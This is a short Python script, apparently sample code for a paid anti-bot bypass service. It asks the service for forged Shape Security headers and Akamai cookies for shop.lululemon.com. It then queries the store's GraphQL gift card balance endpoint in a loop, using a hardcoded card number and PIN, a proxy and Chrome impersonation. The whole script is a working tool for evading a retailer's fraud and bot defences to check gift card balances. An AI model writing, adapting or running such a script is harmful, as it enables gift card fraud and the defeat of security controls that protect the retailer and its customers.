from curl_cffi import request
import json

api_key = 'Your api key'
headers = {
    'Content-Type': 'application/json',
    'X-API-Key': api_key,
}
shape_js_url = 'https://shop.lululemon.com/shared/chunk.273c0224d38f1ad8.js?async' # Your target website shape js url
target_api = 'https://shop.lululemon.com/api/graphql' # The api url of your want to request
proxy = 'http://127.0.0.1:8989' # Your proxy
method = 'POST' # The api method of your want to request

json_data = {
    'task_type': 'shape-headers',
    'params': {
        'shape_js_url': shape_js_url,
        'target_api': target_api,
        'proxy': proxy,
        'method': method,
    },
}

response = request(method='POST', url='https://riskbypass.com/api/task/sync', headers=headers, json=json_data)
print(response.json())
shape_headers = response.json().get('result', {}).get('result')
shape_headers = json.loads(shape_headers) # The shape headers of your want to request
shape_headers.update({
    'accept': 'application/json',
    'accept-language': 'zh-CN,zh;q=0.9',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'sec-ch-ua-mobile': '?0',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'x-lll-client': 'story-app',
})

akm_js = 'https://shop.lululemon.com/-DRP52x9ZoqVytLc7TDsQOqzQEo/N9E7thiNEpJ0/UmhvDi0VAQM/Jg1WHlUp/dRk' # The akamai js url of your want to request, it's not always the same, you need to find it by F12 or use regex to find it
json_data = {
    'task_type': 'akamai3-hard',
    'params': {
        'akamai_js_url': akm_js,
        'proxy': proxy,
    },
}
response = request(method='POST', url='https://riskbypass.com/api/task/sync', headers=headers, json=json_data)
print(response.json())
akm_cookies = response.json().get('result', {}).get('result')
akm_cookies = json.loads(akm_cookies) # The akamai cookies of your want to request
if not shape_headers:
    raise Exception('未知错误')
else:
    for i in range(10):
        print(f'第{i+1}次请求')
        target_data = '{"operationName":"getGiftCardBalance","query":"query getGiftCardBalance($cardNumber: String!, $pin: String!) { getGiftCardBalance(cardNumber: $cardNumber, pin: $pin) { amountAvailable cardNumber currencyCode } }","variables":{"cardNumber":"605143343251006036665","pin":"4786"}}'
        try:
            response = request(method=method, url=target_api, data=target_data, headers=shape_headers, impersonate='chrome136', proxies={'https':proxy}, cookies=akm_cookies)
            print(response.json())
        except Exception as e:
            print(e)